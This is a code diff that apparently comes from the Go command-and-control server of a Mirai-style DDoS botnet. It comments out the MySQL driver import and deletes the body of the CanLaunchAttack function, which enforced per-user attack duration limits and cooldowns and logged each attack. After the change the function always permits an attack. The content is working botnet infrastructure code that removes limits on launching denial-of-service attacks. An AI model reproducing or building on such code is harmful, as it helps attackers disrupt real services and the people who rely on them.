@@ -5,7 +5,7 @@ import (
     "fmt"
     "net"
     "encoding/binary"
-    _"github.com/go-sql-driver/mysql"
+//    _"github.com/go-sql-driver/mysql"
     //"time"
     //"errors"
 )
@@ -106,39 +106,6 @@ func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
 }
 
 func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
-/*    fmt.Println("[database]CanLaunchAttack_start")
-    rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE username = ?", username)
-    defer rows.Close()
-    if err != nil {
-        fmt.Println(err)
-    }
-    fmt.Println("[database]CanLaunchAttack_115 rows;",rows)
-    var userId, durationLimit, cooldown uint32
-    if !rows.Next() {
-        return false, errors.New("Your access has been terminated")
-    }
-    rows.Scan(&userId, &durationLimit, &cooldown)
-    fmt.Println("[database]CanLaunchAttack_NOW")
-    if durationLimit != 0 && duration > durationLimit {
-        return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
-    }
-    rows.Close()
-    fmt.Println("[database]CanLaunchAttack_now")
-    if allowConcurrent == 0 {
-        rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
-        if err != nil {
-            fmt.Println(err)
-        }
-        if rows.Next() {
-            var timeSent, historyDuration uint32
-            rows.Scan(&timeSent, &historyDuration)
-            return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())))
-        }
-    }
-
-    this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
-    fmt.Println("[database]CanLaunchAttack_fin")
-*/
     return true, nil
 }
 
